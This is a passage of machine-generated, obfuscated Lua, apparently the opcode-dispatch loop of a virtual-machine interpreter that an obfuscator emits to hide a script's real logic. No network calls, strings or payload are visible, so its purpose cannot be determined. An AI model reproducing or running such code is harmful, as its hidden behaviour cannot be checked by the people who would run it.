bc;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];bc=y[131]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[784]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb;local bc;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];bc=y[131]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[784]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=71 then if 59>=z then if 53>=z then if 50>=z then if z<=48 then w[y[131]]=h[y[834]];elseif z==49 then local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=false;n=n+1;y=f[n];ba=y[131]w[ba](w[ba+1])else local ba;w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif 51>=z then local ba,bb=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba==1 then w[y[131]]={};else n=n+1;end end else if ba<=4 then if 4~=ba then y=f[n];else w[y[131]]=h[y[834]];end else if ba>5 then y=f[n];else n=n+1;end end end else if ba<=9 then if ba<=7 then w[y[131]]=w[y[834]][y[784]];else if ba>8 then y=f[n];else n=n+1;end end else if ba<=11 then if ba<11 then w[y[131]][y[834]]=w[y[784]];else n=n+1;end else if 13>ba then y=f[n];else w[y[131]]=j[y[834]];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then n=n+1;else if 15<ba then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end else if ba<=18 then if 17==ba then n=n+1;else y=f[n];end else if ba==19 then w[y[131]]=j[y[834]];else n=n+1;end end end else if ba<=23 then if ba<=21 then y=f[n];else if ba~=23 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if ba<=25 then if ba<25 then y=f[n];else bb=y[131]end else if ba~=27 then w[bb]=w[bb]()else break end end end end end ba=ba+1 end elseif 52==z then w[y[131]][y[834]]=y[784];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];else local ba;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](w[ba+1])end;elseif 56>=z then if 54>=z then if not w[y[131]]then n=(n+1);else n=y[834];end;elseif 55<z then w[y[131]]=w[y[834]]/y[784];else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3==ba then w[y[131]]=h[y[834]];else n=n+1;end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[131]]=h[y[834]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if 16~=ba then bd=y[131]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[784]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif z<=57 then if(y[131]<=w[y[784]])then n=n+1;else n=y[834];end;elseif z<59 then local ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))else local ba=y[131]w[ba](r(w,ba+1,p))end;elseif z<=65 then if(62>z or 62==z)then if(60>z or 60==z)then local ba=y[131]w[ba]=w[ba](r(w,(ba+1),p))elseif(z>61)then if(w[y[131]]<=w[y[784]])then n=(n+1);else n=y[834];end;else local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then w[y[131]][y[834]]=y[784];else n=n+1;end else if ba<=2 then y=f[n];else if ba>3 then n=n+1;else w[y[131]]={};end end end else if ba<=6 then if ba>5 then w[y[131]][y[834]]=w[y[784]];else y=f[n];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[131]]=h[y[834]];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[131]]=w[y[834]][y[784]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba~=16 then w[y[131]][y[834]]=w[y[784]];else n=n+1;end else if ba<=17 then y=f[n];else if 18==ba then w[y[131]][y[834]]=w[y[784]];else break end end end end end ba=ba+1 end end;elseif(63==z or 63>z)then if(w[y[131]]<w[y[784]])then n=(n+1);else n=y[834];end;elseif not(65==z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[131]]=j[y[834]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if ba~=5 then w[y[131]]=j[y[834]];else n=n+1;end else if 7>ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if ba<=11 then if ba<=9 then if 9>ba then n=n+1;else y=f[n];end else if ba<11 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if ba<=13 then if 13~=ba then y=f[n];else bb=y[131]end else if ba>14 then break else w[bb]=w[bb](w[bb+1])end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=16 then if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if 2==ba then bd=nil else w[y[131]]=h[y[834]];end end else if ba<=5 then if ba~=5 then n=n+1;else y=f[n];end else if 6==ba then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if 9~=ba then y=f[n];else w[y[131]]=h[y[834]];end else if ba>10 then y=f[n];else n=n+1;end end else if ba<=13 then if ba==12 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if ba<=14 then y=f[n];else if 15<ba then n=n+1;else w[y[131]]=w[y[834]][w[y[784]]];end end end end end else if ba<=25 then if ba<=20 then if ba<=18 then if ba~=18 then y=f[n];else w[y[131]]=h[y[834]];end else if ba<20 then n=n+1;else y=f[n];end end else if ba<=22 then if 21<ba then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if ba<=23 then y=f[n];else if 25>ba then w[y[131]]=j[y[834]];else n=n+1;end end end end else if ba<=29 then if ba<=27 then if 26<ba then w[y[131]]=w[y[834]][y[784]];else y=f[n];end else if ba~=29 then n=n+1;else y=f[n];end end else if ba<=31 then if 31~=ba then bd=y[834];else bc=y[784];end else if ba<=32 then bb=k(w,g,bd,bc);else if 34>ba then w[y[131]]=bb;else break end end end end end end ba=ba+1 end end;elseif 68>=z then if z<=66 then w[y[131]]=w[y[834]]%y[784];elseif 68~=z then local ba;w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba]()else local ba;w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif z<=69 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if w[y[131]]then n=n+1;else n=y[834];end;elseif z~=71 then w[y[131]][y[834]]=y[784];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];else local ba=w[y[784]];if not ba then n=n+1;else w[y[131]]=ba;n=y[834];end;end;elseif 83>=z then if z<=77 then if z<=74 then if 72>=z then local ba=y[131]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[784]do bc=bc+1;w[bd]=bb[bc];end elseif z~=74 then local ba;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))else w[y[131]]=y[834]*w[y[784]];end;elseif 75>=z then local ba;w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))elseif z>76 then local ba=y[131]w[ba]=w[ba](w[ba+1])else local ba=y[131]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end end;elseif z<=80 then if(78>=z)then local ba=y[834];local bb=y[784];local ba=k(w,g,ba,bb);w[y[131]]=ba;elseif 79<z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[131]]=h[y[834]];else n=n+1;end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[131]]=h[y[834]];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba~=16 then bd=y[131]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[784]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then w[y[131]]=w[y[834]][y[784]];else bb=nil end else if 2==ba then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if ba<=6 then y=f[n];else if 7==ba then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba<10 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if ba<=11 then n=n+1;else if ba==12 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[131]else if ba==17 then w[bb]=w[bb](w[bb+1])else break end end end end end ba=ba+1 end end;elseif z<=81 then j[y[834]]=w[y[131]];elseif z==82 then local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))else local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif 89>=z then if 86>=z then if z<=84 then w[y[131]]=(w[y[834]]-w[y[784]]);elseif 86>z then w[y[131]]=w[y[834]]%y[784];else local ba;local bb;w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];bb=y[131];ba=w[y[834]];w[bb+1]=ba;w[bb]=ba[w[y[784]]];end;elseif z<=87 then local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))elseif 89~=z then local ba=y[131];do return w[ba],w[ba+1]end else local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba]()end;elseif 92>=z then if 90>=z then local ba,bb,bc,bd,be,bf=0 while true do if ba<=3 then if ba<=1 then if 1>ba then bb=y[131]else bc=y[784]end else if 3~=ba then bd=bb+2 else be={w[bb](w[bb+1],w[bd])}end end else if ba<=5 then if 5>ba then for bg=1,bc do w[bd+bg]=be[bg];end else bf=w[bb+3]end else if ba~=7 then if bf then w[bd]=bf;n=y[834];else n=n+1 end;else break end end end ba=ba+1 end elseif 92~=z then local ba;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](w[ba+1])else local ba=y[131]w[ba]=w[ba]()end;elseif 93>=z then w[y[131]]=y[834]*w[y[784]];elseif 94<z then local ba;local bb;w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]={r({},1,y[834])};n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];bb=y[131];ba=w[bb];for bc=bb+1,y[834]do t(ba,w[bc])end;else local ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif 143>=z then if z<=119 then if(107==z or 107>z)then if(z<101 or z==101)then if(z==98 or z<98)then if(z==96 or z<96)then local ba,bb=0 while true do if(ba<=8)then if(ba==3 or ba<3)then if ba<=1 then if(1~=ba)then bb=nil else w[y[131]]=w[y[834]][y[784]];end else if 2<ba then y=f[n];else n=n+1;end end else if(ba==5 or ba<5)then if(5~=ba)then w[y[131]]=h[y[834]];else n=n+1;end else if(ba<=6)then y=f[n];else if not(7~=ba)then w[y[131]]=w[y[834]][y[784]];else n=(n+1);end end end end else if ba<=13 then if(ba<10 or ba==10)then if(ba<10)then y=f[n];else w[y[131]]=y[834];end else if ba<=11 then n=(n+1);else if(12==ba)then y=f[n];else w[y[131]]=y[834];end end end else if(ba<=15)then if ba~=15 then n=n+1;else y=f[n];end else if(ba<16 or ba==16)then bb=y[131]else if(ba<18)then w[bb]=w[bb](r(w,(bb+1),y[834]))else break end end end end end ba=ba+1 end elseif not(97~=z)then local ba,bb,bc,bd=0 while true do if ba<=16 then if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else bc=nil end else if ba<3 then bd=nil else w[y[131]]=h[y[834]];end end else if ba<=5 then if 5>ba then n=n+1;else y=f[n];end else if 6==ba then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if 9~=ba then y=f[n];else w[y[131]]=h[y[834]];end else if ba>10 then y=f[n];else n=n+1;end end else if ba<=13 then if 12<ba then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if ba<=14 then y=f[n];else if ba~=16 then w[y[131]]=w[y[834]][w[y[784]]];else n=n+1;end end end end end else if ba<=25 then if ba<=20 then if ba<=18 then if 18~=ba then y=f[n];else w[y[131]]=h[y[834]];end else if 19<ba then y=f[n];else n=n+1;end end else if ba<=22 then if ba<22 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if ba<=23 then y=f[n];else if ba>24 then n=n+1;else w[y[131]]=j[y[834]];end end end end else if ba<=29 then if ba<=27 then if 26==ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if 28<ba then y=f[n];else n=n+1;end end else if ba<=31 then if ba==30 then bd=y[834];else bc=y[784];end else if ba<=32 then bb=k(w,g,bd,bc);else if 34~=ba then w[y[131]]=bb;else break end end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[131]]=h[y[834]];end else if 2<ba then y=f[n];else n=n+1;end end else if ba<=5 then if ba~=5 then w[y[131]]=y[834];else n=n+1;end else if ba>6 then w[y[131]]=y[834];else y=f[n];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if ba>10 then n=n+1;else w[y[131]]=y[834];end end else if ba<=13 then if 12<ba then bb=y[131]else y=f[n];end else if 14<ba then break else w[bb]=w[bb](r(w,bb+1,y[834]))end end end end ba=ba+1 end end;elseif(99>=z)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba~=4 then w[y[131]]=h[y[834]];else n=n+1;end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[131]]=h[y[834]];end else if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[131]end else if ba<=17 then bb=0;else if ba>18 then break else for be=bd,y[784]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end elseif(z~=101)then w[y[131]]=false;else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4~=ba then w[y[131]]=h[y[834]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[131]]=h[y[834]];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[131]end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[784]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(104>=z)then if(102==z or 102>z)then local ba=0 while true do if ba<=14 then if(ba==6 or ba<6)then if(ba<=2)then if(ba==0 or ba<0)then w={};else if not(ba==2)then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=(n+1);end end else if(ba==4 or ba<4)then if(ba>3)then w[y[131]]=h[y[834]];else y=f[n];end else if ba~=6 then n=n+1;else y=f[n];end end end else if ba<=10 then if(ba<=8)then if not(8==ba)then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if 9<ba then w[y[131]]=h[y[834]];else y=f[n];end end else if ba<=12 then if(12>ba)then n=(n+1);else y=f[n];end else if 14>ba then w[y[131]]={};else n=n+1;end end end end else if ba<=21 then if(ba<17 or ba==17)then if(ba<=15)then y=f[n];else if 16==ba then w[y[131]]={};else n=n+1;end end else if(ba<=19)then if(ba==18)then y=f[n];else w[y[131]][y[834]]=w[y[784]];end else if not(ba==21)then n=n+1;else y=f[n];end end end else if ba<=25 then if(ba<23 or ba==23)then if 23>ba then w[y[131]]=j[y[834]];else n=(n+1);end else if 24<ba then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end else if(ba==27 or ba<27)then if 26<ba then y=f[n];else n=(n+1);end else if(29>ba)then if w[y[131]]then n=(n+1);else n=y[834];end;else break end end end end end ba=ba+1 end elseif z~=104 then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then w[y[131]][y[834]]=y[784];else n=n+1;end else if ba<=2 then y=f[n];else if 4>ba then w[y[131]]={};else n=n+1;end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[131]][y[834]]=w[y[784]];end else if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[131]]=h[y[834]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[131]]=w[y[834]][y[784]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba<16 then w[y[131]][y[834]]=w[y[784]];else n=n+1;end else if ba<=17 then y=f[n];else if ba==18 then w[y[131]][y[834]]=w[y[784]];else break end end end end end ba=ba+1 end else w[y[131]]={};end;elseif(z<105 or z==105)then if(not(w[y[131]]==w[y[784]]))then n=n+1;else n=y[834];end;elseif z~=107 then w[y[131]]=h[y[834]];else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba==3 then w[y[131]]=h[y[834]];else n=n+1;end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[131]]=h[y[834]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if ba~=16 then bd=y[131]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba>18 then break else for be=bd,y[784]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end end;elseif z<=113 then if 110>=z then if(z<108 or z==108)then if(y[131]<w[y[784]])then n=(n+1);else n=y[834];end;elseif(z<110)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[131]]=h[y[834]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if ba==4 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if 6<ba then w[y[131]]=y[834];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if 10==ba then w[y[131]]=y[834];else n=n+1;end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[131]end else if ba==14 then w[bb]=w[bb](r(w,bb+1,y[834]))else break end end end end ba=ba+1 end else local ba,bb,bc=0 while true do if ba<=24 then if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba==1 then bc=nil else w[y[131]]={};end end else if ba<=3 then n=n+1;else if ba~=5 then y=f[n];else w[y[131]]=h[y[834]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 7<ba then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end else if ba<=9 then n=n+1;else if 10==ba then y=f[n];else w[y[131]]=h[y[834]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then n=n+1;else if 13==ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end else if ba<=15 then n=n+1;else if 16<ba then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end end else if ba<=20 then if ba<=18 then n=n+1;else if 19==ba then y=f[n];else w[y[131]]={};end end else if ba<=22 then if 22~=ba then n=n+1;else y=f[n];end else if 23==ba then w[y[131]]={};else n=n+1;end end end end end else if ba<=37 then if ba<=30 then if ba<=27 then if ba<=25 then y=f[n];else if 27>ba then w[y[131]]=h[y[834]];else n=n+1;end end else if ba<=28 then y=f[n];else if ba==29 then w[y[131]][y[834]]=w[y[784]];else n=n+1;end end end else if ba<=33 then if ba<=31 then y=f[n];else if ba==32 then w[y[131]]=h[y[834]];else n=n+1;end end else if ba<=35 then if 34<ba then w[y[131]][y[834]]=w[y[784]];else y=f[n];end else if 36==ba then n=n+1;else y=f[n];end end end end else if ba<=43 then if ba<=40 then if ba<=38 then w[y[131]][y[834]]=w[y[784]];else if 39<ba then y=f[n];else n=n+1;end end else if ba<=41 then w[y[131]]={r({},1,y[834])};else if 42==ba then n=n+1;else y=f[n];end end end else if ba<=46 then if ba<=44 then w[y[131]]=w[y[834]];else if 46~=ba then n=n+1;else y=f[n];end end else if ba<=48 then if 48~=ba then bc=y[131];else bb=w[bc];end else if 49<ba then break else for bd=bc+1,y[834]do t(bb,w[bd])end;end end end end end end ba=ba+1 end end;elseif(111==z or 111>z)then local ba=0 while true do if(ba<=6)then if(ba<2 or ba==2)then if(ba<=0)then w[y[131]]=w[y[834]][y[784]];else if ba>1 then y=f[n];else n=(n+1);end end else if(ba==4 or ba<4)then if(3==ba)then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if ba<6 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if(ba<=9)then if(ba<7 or ba==7)then n=(n+1);else if(8<ba)then w[y[131]][y[834]]=w[y[784]];else y=f[n];end end else if(ba==11 or ba<11)then if(10<ba)then y=f[n];else n=n+1;end else if 12<ba then break else n=y[834];end end end end ba=(ba+1)end elseif 113~=z then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else w[y[131]]=j[y[834]];end else if ba<=2 then n=n+1;else if ba==3 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba>6 then w[y[131]]=y[834];else y=f[n];end end else if ba<=8 then n=n+1;else if ba<10 then y=f[n];else w[y[131]]=y[834];end end end end else if ba<=15 then if ba<=12 then if 11==ba then n=n+1;else y=f[n];end else if ba<=13 then w[y[131]]=y[834];else if ba<15 then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[131]]=y[834];else if 18~=ba then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[131]else if 20==ba then w[bb]=w[bb](r(w,bb+1,y[834]))else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[131]]=w[y[834]][y[784]];end else if 2==ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba==4 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if ba<=6 then y=f[n];else if ba==7 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if ba<=11 then n=n+1;else if ba~=13 then y=f[n];else w[y[131]]=false;end end end else if ba<=15 then if ba==14 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[131]else if ba~=18 then w[bb](w[bb+1])else break end end end end end ba=ba+1 end end;elseif(116==z or 116>z)then if(114>z or 114==z)then local ba,bb=0 while true do if(ba==7 or ba<7)then if(ba==3 or ba<3)then if(ba<1 or 